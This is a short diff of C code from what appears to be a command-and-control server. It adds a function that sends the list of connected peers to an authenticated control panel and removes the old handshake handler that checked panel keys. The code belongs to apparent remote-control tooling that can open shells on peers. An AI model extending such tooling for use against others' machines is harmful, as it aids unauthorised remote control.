@@ -18,6 +18,11 @@ bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData)
     return true;
 }
 
+void laikaC_sendPeerList(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
+{
+    laikaC_iterPeers(cnc, sendPanelPeerIter, (void *)authPeer);
+}
+
 void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
 {
     laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_ADD_PEER_RES);
@@ -45,33 +50,6 @@ void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
 }
 
 /* ================================[[ [Auth] Packet Handlers ]]================================= */
-
-void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
-                                         void *uData)
-{
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
-    struct sLaika_cnc *cnc = pInfo->cnc;
-    PEERTYPE type;
-    int i;
-
-    type = laikaS_readByte(&authPeer->sock);
-    switch (type) {
-    case PEER_AUTH:
-        /* check that peer's pubkey is authenticated */
-        if (!laikaK_checkAuth(authPeer->peerPub, cnc->authKeys, cnc->authKeysCount))
-            LAIKA_ERROR("unauthorized panel!\n");
-
-        /* notify cnc */
-        laikaC_setPeerType(cnc, authPeer, PEER_AUTH);
-        LAIKA_DEBUG("Accepted authenticated panel %p\n", authPeer);
-
-        /* they passed! send list of our peers */
-        laikaC_iterPeers(cnc, sendPanelPeerIter, (void *)authPeer);
-        break;
-    default:
-        LAIKA_ERROR("unknown peerType [%d]!\n", authPeer->type);
-    }
-}
 
 void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
                                          void *uData)
